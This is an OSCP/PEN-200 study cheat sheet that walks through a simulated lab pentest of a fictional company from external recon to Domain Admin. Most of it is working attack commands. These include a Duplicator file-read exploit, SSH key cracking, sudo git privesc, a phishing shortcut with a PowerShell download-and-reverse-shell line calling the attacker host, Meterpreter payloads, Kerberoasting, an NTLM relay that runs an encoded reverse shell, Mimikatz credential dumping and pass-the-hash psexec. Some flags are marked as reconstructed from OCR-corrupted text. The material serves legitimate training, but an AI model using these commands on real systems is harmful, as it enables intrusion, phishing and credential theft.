# Assembling the Pieces Cheat Sheet (PEN-200, Ch. 27)

> This chapter is the **master flow** — a single simulated end-to-end pentest (client "BEYOND Finances") that chains together recon → foothold → privesc → phishing → internal AD enumeration → Kerberoasting → NTLM relay → domain compromise. Treat it as "Challenge Lab Zero": the mindset/order-of-operations to reuse on Challenge Labs 1-6 and the exam. Some OCR corruption in the source garbled a handful of exact flags (marked *reconstructed* below) — logic/order is preserved verbatim from the walkthrough.

## Engagement Goals (this walkthrough)
1. Gain access to the internal network from two public-facing hosts.
2. Obtain Domain Admin privileges in the `beyond.com` AD environment.
3. Access the Domain Controller.

## 0. Workspace Setup (do this before touching anything)

> Reuse of a Kali VM across engagements risks leaking one client's data into another. **Use a fresh Kali image per assessment.**

```bash
mkdir beyond
cd beyond
mkdir mailsrv1
mkdir websrv1
touch creds.txt
```

- Create one directory per target host, plus a running `creds.txt` (users/passwords found) and (later) `computer.txt` (hosts/roles/IPs discovered).
- Real engagements: consider Markdown note-taking (e.g. Obsidian) for findings/report writing.
- **Enumeration is cyclic** — every new host/user/credential loops back into earlier phases (this chapter's connective thread top to bottom).

---

## Stage 1 — Enumerating the Public Network (27.1)

Two public targets provided by client: `MAILSRV1` (192.168.50.242) and `WEBSRV1` (192.168.50.244).

### 27.1.1 MAILSRV1

```bash
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
```
Results: `smtp`(25, hMailServer), `http`(80, IIS 10.0), `pop3`(110), `msrpc`(135), `netbios-ssn`(139), `imap`(143), `microsoft-ds`(445), `smtp`(587) → **Windows host running hMailServer + IIS**.

- Researched hMailServer on its project site (unfamiliar app) — free/open-source mail server; no obviously mapped current CVE.
- Directory brute-force the IIS site:
```bash
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -t 10 -x txt,pdf,config
```
Result: **nothing found** — logged anyway. *Not every enumeration technique needs a hit; run a variety before moving on.*

> Decision point: mail server currently unusable — no creds yet. Noted for a **later phishing pivot** once credentials exist. Enumeration result stored for later re-use, not discarded.

### 27.1.2 WEBSRV1

```bash
sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
```
Results: `ssh`(22, OpenSSH 8.9p1 Ubuntu 3) and `http`(80, Apache 2.4.52, WordPress 6.0.2 via `http-generator`).

- SSH banner → looked up "OpenSSH 8.9p1 Ubuntu 3" on Ubuntu's Launchpad OpenSSH-to-release mapping → **Ubuntu 22.04 "Jammy Jellyfish"**.
- No creds yet for SSH password attack → enumerate HTTP first.
- Apache 2.4.52 checked for CVEs too (skipped in text as unproductive) — book's point: **check every fingerprinted version**, even if this walkthrough elides some for time.
- Browsed site manually; page had no nav/menu, but page source/footer links revealed `wp-content` / `wp-includes` → WordPress.
```bash
whatweb http://192.168.50.244
```
Confirms `WordPress[6.0.2]`, Apache 2.4.52, jQuery 3.6.0. Core WordPress itself is current/patched — **pivot to plugins/themes** (community-maintained, frequently unpatched).

```bash
wpscan --url http://192.168.50.244/main/ --enumerate p --plugins-detection aggressive
```
*(exact flags obscured by OCR corruption in source; the walkthrough runs WPScan **without** an API token — `--url` + aggressive plugin enumeration via `-e ap` / `--plugins-detection aggressive` is the no-token equivalent.)*

Plugins found: `akismet` (version undetectable), `classic-editor`, `contact-form-7` (up to date), **`duplicator`** (readme reports 1.3.26, flagged out of date), `elementor`, `wordpress-seo`.

- Because most plugins were current and `akismet`'s version couldn't be fingerprinted, focus shifts to **Duplicator 1.3.26**:
```bash
searchsploit duplicator
```
Two matches for 1.3.26: an ExploitDB Python script (Unauthenticated Arbitrary File Read, CVE-2020-11738) and a Metasploit module.

> Key decision: prefer the standalone script here since it's reviewed first; Metasploit module noted as an alternative.

---

## Stage 2 — Attacking a Public Machine / Initial Foothold (27.2)

### 27.2.1 Initial foothold — Directory Traversal → SSH key

```bash
searchsploit -x 50420              # view exploit source before running it
cd beyond/websrv1
searchsploit -m 50420              # copy exploit into workspace
```

Exploit is a GET-based directory traversal (`../../../..` style) against Duplicator 1.3.26 (CVE-2020-11738):
```bash
python3 50420.py http://192.168.50.244 /etc/passwd
```
→ recovers `/etc/passwd`, revealing local users **daniela** and **marcus**. Add both to `creds.txt`.

- Standard next move for directory traversal footholds (per Common Web App Attacks): **hunt for SSH private keys**.
```bash
python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
```
→ recovers daniela's `id_rsa` (OpenSSH format), saved locally as `id_rsa`.

```bash
chmod 600 id_rsa
ssh -i id_rsa daniela@192.168.50.244
```
Key is passphrase-protected → crack it:
```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# cracked: tequieromucho
ssh -i id_rsa daniela@192.168.50.244
# Enter passphrase: tequieromucho  -> shell as daniela@websrv1
```
Add `daniela:tequieromucho` to `creds.txt` — **users reuse passwords; keep it for spraying later.**

### 27.2.2 Local privesc on WEBSRV1

Time-boxed engagement → run an automated Linux enumeration script first:
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80                      # Kali: serve linpeas
```
```bash
wget http://192.168.119.5/linpeas.sh           # target: pull the script
chmod a+x ./linpeas.sh
./linpeas.sh
```

linPEAS findings mined for privesc/loot:
1. **sudo -l**: `daniela` can run `/usr/bin/git` via sudo, no password.
2. **Analyzing Wordpress Files**: `/srv/www/wordpress/wp-config.php` → `DB_USER=wordpress`, `DB_PASSWORD=DanielKeyboard3311` (clear-text). Note: install path is `/srv/www/wordpress/`, **not** the Debian-default `/var/www/html` — filed away, not immediately actionable.
3. **Analyzing Github Files**: `/srv/www/wordpress/.git` exists but is `root`-owned/unreadable — usable only via the sudo git privilege above.

> Repeat linPEAS **after** privesc — root-level access may surface information invisible as a low-priv user.

Abuse `sudo git` via GTFOBins (search "git" → Sudo section):
```bash
sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
# sudo: sorry, you are not allowed to set the following environment variables: PAGER   <- vector #1 blocked
```
Vector #2 — trigger git's default pager (`less`) in a privileged context, then break out from within `less`:
```bash
sudo git -p help
!/bin/bash
whoami
# root
```
→ root shell on WEBSRV1.

### Looting the Git repository (as root)

```bash
cd /srv/www/wordpress/
git status
git log
```
Two commits: `initial commit` and `Removed staging script and internal network access` — the second commit's message hints the repo **used to have** internal-network reach via a script that was deleted.

```bash
git show <commit-hash>          # display the diff of the "removed" commit (Listing 1138)
```
Diff reveals a deleted `fetch_current.sh`:
```bash
#!/bin/bash
# Script to obtain the current state of the web app from the staging server
sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```
→ new creds `john:dqsTwTpZPn#nL`, and a new host `192.168.50.245` ("staging server"). Add to `creds.txt`.

**Stage 2 summary:** WEBSRV1 is Ubuntu 22.04, not internally connected (single NIC — confirmed via `ip a` / linPEAS network section) → cannot pivot from here directly. Value extracted instead: **3 sets of creds/usernames** to carry forward.

---

## Stage 3 — Gaining Access to the Internal Network (27.3)

### 27.3.1 Domain credential validation

```bash
cat creds.txt
# daniela:tequieromucho
# wordpress:DanielKeyboard3311   (service account, not a real user -> excluded)
# john:dqsTwTpZPn#nL
# users: marcus, daniela
```
Build combo lists and password-spray MAILSRV1's SMB:
```bash
cat > usernames.txt <<EOF
marcus
john
daniela
EOF

cat > passwords.txt <<EOF
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
EOF

crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt
```
Hit: `beyond.com\john:dqsTwTpZPn#nL` — **valid domain creds**, confirmed by CrackMapExec auto-detecting/prefixing the domain name (→ MAILSRV1 is domain-joined). No `Pwn3d!` flag → john is **not** local admin there.

> `STATUS_LOGON_FAILURE` from CME means wrong password **or** nonexistent user — can't yet confirm `daniela`/`marcus` are real domain accounts from this alone.

```bash
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
```
Only default shares (`ADMIN$`, `C$`, `IPC$`) — no accessible custom shares. Dead end for SMB looting.

> With no WinRM/RDP on MAILSRV1 and no useful shares, the only remaining lever is a **client-side attack (phishing)** against `daniela`/`marcus`.

### 27.3.2 Phishing for access

Chosen technique: **Windows Library file (`.Library-ms`) + malicious shortcut** (chosen over Office macros since Office may not be installed on unknown internal hosts).

Kali — stand up a WebDAV share to host the Library's target location:
```bash
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

On `WINPREP` (RDP as `offsec:lab`) — build the payload files:
- `config.Library-ms` — Windows Library pointing its `<simpleLocation><url>` at `http://192.168.119.5` (the WebDAV share).
- A `.lnk` shortcut whose target runs a PowerShell download-cradle + PowerCat reverse shell:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
Transfer both files back to Kali into the WebDAV directory.

Kali — serve PowerCat and catch the callback:
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
nc -nvlp 4444
```

Build the pretext (`body.txt`) using **info scavenged from WEBSRV1's Git repo** (the "staging script" reference) to sound like an internal IT email from `john`. Send via `swaks`:
```bash
swaks -t daniela@beyond.com -t marcus@beyond.com \
  --attach @config.Library-ms \
  --from john@beyond.com \
  --header "Subject: Staging Script" \
  --body body.txt \
  --server 192.168.50.242 \
  --suppress-data -ap
```
*(flag layout reconstructed from OCR-corrupted listing; `-t` per recipient, `--attach` the Library file, `--server` = MAILSRV1, `-ap` = SMTP AUTH using john's cracked creds.)*

Victim opens attachment → Library resolves to the WebDAV share → shortcut executes → reverse shell lands on port 4444:
```powershell
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
beyond\marcus
PS> hostname
CLIENTWK1
PS> ipconfig
# IPv4 Address: 172.16.6.243 / 255.255.255.0, Gateway 172.16.6.254
```
→ **internal network foothold** as domain user `marcus` on `CLIENTWK1` (172.16.6.0/24).

---

## Stage 4 — Enumerating the Internal Network (27.4)

### 27.4.1 Situational awareness — local host + AD overview

```powershell
cd C:\Users\marcus
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
> winPEAS's own reported OS info can be wrong/misleading — **cross-check with a native command**:
```powershell
systeminfo
# OS Name: Microsoft Windows 11 Pro
```
(winPEAS output pointed to "Windows 10-like" categorization; `systeminfo` confirms it's actually Windows 11.)

- winPEAS **AV Information**: no AV detected → simplifies later tooling (Meterpreter, Mimikatz, etc. without AV friction).
- **Network Ifaces / known hosts / DNS cache**: reveals `dcsrv1.beyond.com` (172.16.6.240) and `mailsrv1.beyond.com` (172.16.6.254 — **internal** IP, vs. the 192.168.50.242 seen externally → MAILSRV1 is **dual-homed**).

Log discovered hosts in a running `computer.txt`:
```
172.16.6.240 - DCSRV1.BEYOND.COM      -> Domain Controller
172.16.6.254 - MAILSRV1.BEYOND.COM    -> Mail Server, dual-homed (ext: 192.168.50.242)
172.16.6.243 - CLIENTWK1.BEYOND.COM   -> marcus fetches email here
```

No local privesc vector found on CLIENTWK1 → **pivot to AD enumeration** with BloodHound:
```powershell
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
dir                                   # locate the output zip, e.g. 20221010072521_BloodHound.zip
```
Transfer the zip to Kali, start `neo4j`/BloodHound GUI, **Upload Data**.

Custom Cypher queries (Raw Query box) used for basic domain enumeration (not covered by pre-built queries):
```cypher
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
```
- Computers found: `DCSRV1` (DC), `MAILSRV1` (Server 2022, dual-homed), `CLIENTWK1` (Win11), and a **new** host `INTERNALSRV1` — resolve its IP:
```powershell
nslookup INTERNALSRV1.BEYOND.COM
# 172.16.6.241
```
- Users found: `BECCY`, `JOHN`, `DANIELA`, `MARCUS`. Mark `marcus` (interactive shell) and `john` (valid creds) as **Owned** in BloodHound (right-click → Mark User as Owned) to unlock ownership-based pre-built queries.
- Pre-built query **Find all Domain Admins** → `BECCY` is a Domain Admin (besides the built-in `Administrator`).

> Domain Groups/GPOs enumeration skipped here as unproductive for this environment — in a real test, still check both; they're powerful privesc/lateral-movement levers.

Pre-built queries run for low-hanging fruit — **all returned empty**:
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals

> BloodHound pre-built queries are usually the fast/easy win — when they're empty, fall back to manual techniques (PowerView/LDAP queries, or the session/Kerberoast digging below).

### 27.4.2 Deeper enumeration — sessions, Kerberoasting targets, internal port scan

Custom relationship query for **active sessions**:
```cypher
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
3 sessions found — notably **Domain Admin `beccy` has an active session on MAILSRV1** (a high-value target: NTLM hash of a DA sitting in memory there).

Pre-built **List all Kerberoastable Accounts** → `daniela` is kerberoastable (besides `krbtgt`, which is skipped — its randomly-generated password makes cracking infeasible). `daniela`'s SPN: `http/internalsrv1.beyond.com` → implies a web app on `INTERNALSRV1`.

Set up pivoting to scan the internal subnet from Kali via Meterpreter + SOCKS5:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
sudo msfconsole -q
```
```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.119.5
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```
```powershell
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe
```
→ Meterpreter session 1 (CLIENTWK1).

```
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
msf6 post(multi/manage/autoroute) > run
# Route added to subnet 172.16.6.0/255.255.255.0

msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```
Confirm `/etc/proxychains4.conf` has the matching SOCKS5 entry (`socks5 127.0.0.1 1080`), then:
```bash
cat /etc/proxychains4.conf
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```
Findings: `DCSRV1` shares include `NETLOGON`/`SYSVOL` (READ); `INTERNALSRV1` only defaults; **SMB signing is `False` on both MAILSRV1 and INTERNALSRV1** (relay-attack precondition noted for later). `john` has no local-admin `Pwn3d!` anywhere.

> CrackMapExec 5.4.0 can throw `NETBIOS connection ... timed out` against some DCs — upgrade to 5.4.1+.

```bash
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
```
(Must use `-sT` — SYN scans don't work over proxychains.) Result: `INTERNALSRV1` has 80+443 open (web app — matches daniela's SPN hint); MAILSRV1 has both closed.

Set up a **Chisel** reverse tunnel to browse `INTERNALSRV1`'s web app directly from Firefox (rather than proxychains + browser SOCKS config):
```bash
chmod a+x chisel
./chisel server -p 8080 --reverse
```
```
msf6 auxiliary(server/socks_proxy) > sessions -i 1
meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
meterpreter > shell
```
```cmd
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
```
Browse `http://127.0.0.1/` on Kali → WordPress site on INTERNALSRV1. Direct nav to `/wp-admin` redirects to `internalsrv1.beyond.com` (site's configured `WordPress Address (URL)`), which Kali can't resolve → fix locally:
```bash
echo "127.0.0.1 internalsrv1.beyond.com" | sudo tee -a /etc/hosts
```
Browse `http://internalsrv1.beyond.com/wp-admin` — login page now loads; tried known creds + `admin:admin` — **all fail** at this point (login succeeds later, after Kerberoasting).

**Stage 4 recap:** DA `beccy` has a live session on MAILSRV1; `daniela` is Kerberoastable with an SPN pointing at a WordPress app on INTERNALSRV1; SMB signing disabled on two hosts (relay potential); no direct RDP/local-admin/DA-path found via BloodHound.

---

## Stage 5 — Attacking an Internal Web Application (27.5)

### 27.5.1 Kerberoasting

```bash
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
```
→ TGS-REP hash for `daniela` (SPN `http/internalsrv1.beyond.com`).

> If you hit `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`:
> ```bash
> proxychains net time -S <DC_IP>
> faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip <DC_IP> beyond.com/john
> ```

```bash
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
# cracked: DANIelaRO123
```
Add `daniela:DANIelaRO123` to `creds.txt`. Log in to WordPress `/wp-admin` as `daniela` → **success**.

> Already established no domain user is local admin anywhere and RDP is closed off — but other protocols (e.g. **WinRM**) could still work with a fresh credential; keep checking as new creds appear.

### 27.5.2 Abuse a WordPress plugin for an NTLM relay attack

Reviewed WordPress dashboard: `daniela` is the only user; **Backup Migration** plugin (of 3 installed) is active and exposes a configurable **Backup directory path** field (accepts a UNC/URI-style path) — a classic forced-authentication trigger.

Two candidate attack vectors weighed:
1. Upload a malicious plugin for direct RCE on INTERNALSRV1.
2. Abuse the Backup Migration path field to force **INTERNALSRV1's local Administrator** to authenticate to Kali, then **relay** that auth to **MAILSRV1** (assumption: local Administrator password reused across both, per BloodHound/CME evidence) → straight shot at code execution + eventually beccy's DA hash on MAILSRV1.

> Vector 2 chosen — it directly serves a primary engagement goal (Domain Admin access) rather than "just" popping one box.

Set up the relay **before** touching the plugin config:
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
nc -nvlp 9999
```
(`-t` = MAILSRV1's **external** IP, so the relay itself doesn't need proxychains; `-c` = base64 PowerShell reverse shell to Kali:9999.)

In WordPress → Backup Migration plugin → set **Backup directory path** to `//192.168.119.5/test` (Kali's IP, nonexistent share name) → **Save**:
```
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
[*] Executed specified command on host: 192.168.50.242
```
Catch the shell:
```
listening on [any] 9999 ...
whoami
nt authority\system
hostname
MAILSRV1
```
→ **SYSTEM on MAILSRV1** by relaying INTERNALSRV1's local-Administrator NTLM auth (forced via the plugin's path field) to MAILSRV1 (works because SMB signing was disabled there and the local Administrator password is shared between both boxes).

---

## Stage 6 — Gaining Access to the Domain Controller (27.6)

### 27.6.1 Cached credentials — extract beccy's hash/password

> Don't skip local enumeration on MAILSRV1 just because SYSTEM was fast to get — still worth a look for extra loot. (Walkthrough proceeds directly to credential extraction here since `beccy`'s live session was already the known target.)

Upgrade the netcat shell to Meterpreter for a more robust post-exploitation shell:
```powershell
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe
```
```
msf6 > sessions -i 2
meterpreter > shell
C:\Users\Administrator> powershell
```
```powershell
iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
Output for `beccy`:
```
User Name : beccy
Domain    : BEYOND
NTLM      : f0397ec5af49971f6efbdb07877046b3
kerberos:
  Password: NiftyTopekaDevolve6655!#!
```
→ Domain Admin's **clear-text password and NTLM hash**, both saved to `creds.txt`.

### 27.6.2 Lateral movement to the Domain Controller

```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
```
(NTLM hash used over the clear-text password — either works; hash chosen here.)
```cmd
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> hostname
DCSRV1
C:\Windows\system32> ipconfig
# IPv4 Address: 172.16.6.240
```
→ **All engagement goals met**: internal network access, Domain Admin privileges, interactive access to the Domain Controller.

---

## 27.7 Wrapping Up — Key Takeaways

- **Take detailed, timestamped notes throughout** — this walkthrough only worked because creds/hosts found in Stage 2 (a dead-end box) were reused in Stages 3–6.
- **Clean up after yourself** — remove exploits/artifacts (uploaded binaries, webshells, scheduled tasks, relay listeners) or explicitly disclose their location/existence to the client.
- **Don't stop enumerating at first foothold** — a matching exploit ≠ a reason to skip remaining recon; you may miss data critical to other systems.
- **Re-enumerate after privilege escalation** — root/SYSTEM access exposes files/data invisible as a low-priv user (re-run linPEAS/winPEAS/Mimikatz-style tooling post-escalation).
- **Combine information across systems and stages** — a credential or path found on host A may only become useful on host D, three stages later. This cross-referencing (creds.txt / computer.txt) is the actual skill being taught.

## Master Workflow / Order of Operations (reusable checklist)

| # | Phase | Core tools/techniques used here |
|---|---|---|
| 1 | Workspace setup | `mkdir`/`creds.txt`/`computer.txt`, fresh Kali per client |
| 2 | External recon | `nmap -sC -sV`, `gobuster dir`, `whatweb`, `wpscan`, banner → version-to-release lookups |
| 3 | Vuln → exploit match | `searchsploit`, exploit source review before running (`-x`), CVE lookup |
| 4 | Initial foothold | Directory traversal / file read → SSH keys, `ssh2john`+`john` for passphrases |
| 5 | Local privesc | `linpeas.sh`/`winpeas.exe`, `sudo -l`, GTFOBins, Git repo/log/diff looting |
| 6 | Credential reuse | Central `creds.txt`, `crackmapexec smb <targets> -u <userlist> -p <passlist>` spraying |
| 7 | Client-side pivot | WebDAV (`wsgidav`) + `.Library-ms` + `.lnk` shortcut, PowerCat, `swaks` phishing |
| 8 | Internal situational awareness | `winPEAS`/`systeminfo` (cross-check!), `ipconfig`, DNS cache, `computer.txt` |
| 9 | AD enumeration | `SharpHound.ps1` / `Invoke-BloodHound -CollectionMethod All`, custom Cypher + pre-built queries |
| 10 | Pivoting | `msfvenom` + `multi/handler`, `multi/manage/autoroute`, `auxiliary/server/socks_proxy`, `proxychains`, `chisel` |
| 11 | Targeted AD attacks | `impacket-GetUserSPNs` (Kerberoast) + `hashcat -m 13100`, NTLM relay via `impacket-ntlmrelayx` off a forced-auth web app field |
| 12 | Credential harvesting | `mimikatz` (`privilege::debug` / `sekurlsa::logonpasswords`) against a box with a target user's live session |
| 13 | Domain compromise | `impacket-psexec -hashes <LM:NT> <user>@<DC>` |
| 14 | Wrap-up | Cleanup artifacts, finalize notes, verify all stated engagement goals were met |

---

## Appendix — Challenge Labs & OSCP Exam Quick Reference (Ch. 28)

> Included here because it directly follows this chapter in the source material and is exam-relevant.

### Challenge Lab types
| Labs | Type | Notes |
|---|---|---|
| 0 | SECURA (ramp-up) | 3-machine env; ManageEngine exploit, pivoting, insecure GPO perms. Uses "Assumed Breach" creds `Eric.Wallows / EricLikesRunning800` |
| 1–3 | Scenarios (MEDTECH, RELIA, SKYLARK) | Full networks/domains, progressively harder. **Lab 3 is beyond OSCP scope** — do 4-6 first if exam-focused |
| 4–6 | OSCP-like mock exams | 3 AD-joined + 3 standalone machines each; same structure as the real exam. Assumed Breach creds: `Eric.Wallows / EricLikesRunning800` |
| 7–10 | ZEUS/POSEIDON/FEAST/... | Harder, beyond OSCP scope (PEN-300-adjacent skills) |

### Exam-relevant structural facts
- Exam mirrors Challenge Labs 4-6 exactly: **3 standalone machines (20 pts each = 60) + 1 AD set (40 pts: 10/10/20)**.
- **Pass mark: 70 points.** Duration: **23h45m**, entirely dedicated to you.
- Every exam machine **is** intended to be exploitable with a privesc path (unlike some Challenge Lab decoys that intentionally aren't hackable).
- AD set and each standalone machine are **independent mini-environments** — no cross-dependencies between the 4 groups; standalone machines *can* have dependencies on each other though.
- IP address ordering/octets carry **no meaning** — don't assume lower IP = easier/first.
- Internal subnets are typically **not directly routable** — expect to pivot/tunnel (same pattern as this chapter's chisel/proxychains work).
- Some hosts may not respond to ICMP — absence of ping response ≠ host doesn't exist; always confirm with a port scan (`-Pn`).
- Password cracking: if rockyou + gathered wordlists don't crack something in ~10 minutes, **reconsider the vector** rather than brute-forcing harder (unless you have serious cracking hardware).
- Metasploit: **encouraged** in Challenge Labs, **limited use** on the actual exam — practice both with and without it.
- Client-side simulation "NPCs" in the labs act on ~3-minute intervals; watch for inter-machine communication as a discovery hint.

### Booking/logistics
- Exam is scheduled via the exam calendar in the OffSec Training Library.
- Screen-share/ID verification required at start; VPN pack provided in the exam control panel.
- Report submission deadline and required content — check current **OSCP exam guide** for specifics (results in ~10 business days).
